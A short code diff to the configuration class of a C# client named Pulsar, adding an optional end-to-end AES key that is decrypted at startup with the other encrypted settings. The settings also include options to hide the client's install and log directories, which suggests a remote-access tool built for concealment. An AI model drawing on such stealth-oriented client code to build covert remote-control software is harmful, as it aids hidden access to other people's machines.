@@ -34,6 +34,7 @@ namespace Pulsar.Client.Config
         public static string SERVERSIGNATURE = "";
         public static string SERVERCERTIFICATESTR = "";
         public static X509Certificate2 SERVERCERTIFICATE;
+        public static string AESE2EKEY = "";
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
         public static string INSTALLPATH = "";
@@ -72,6 +73,7 @@ namespace Pulsar.Client.Config
         public static string SERVERSIGNATURE = "";
         public static string SERVERCERTIFICATESTR = "";
         public static X509Certificate2 SERVERCERTIFICATE;
+        public static string AESE2EKEY = "";
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
         public static string INSTALLPATH = "";
@@ -99,6 +101,11 @@ namespace Pulsar.Client.Config
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+            
+            if (!string.IsNullOrEmpty(AESE2EKEY))
+            {
+                AESE2EKEY = aes.Decrypt(AESE2EKEY);
+            }
             SetupPaths();
             return VerifyHash();
         }
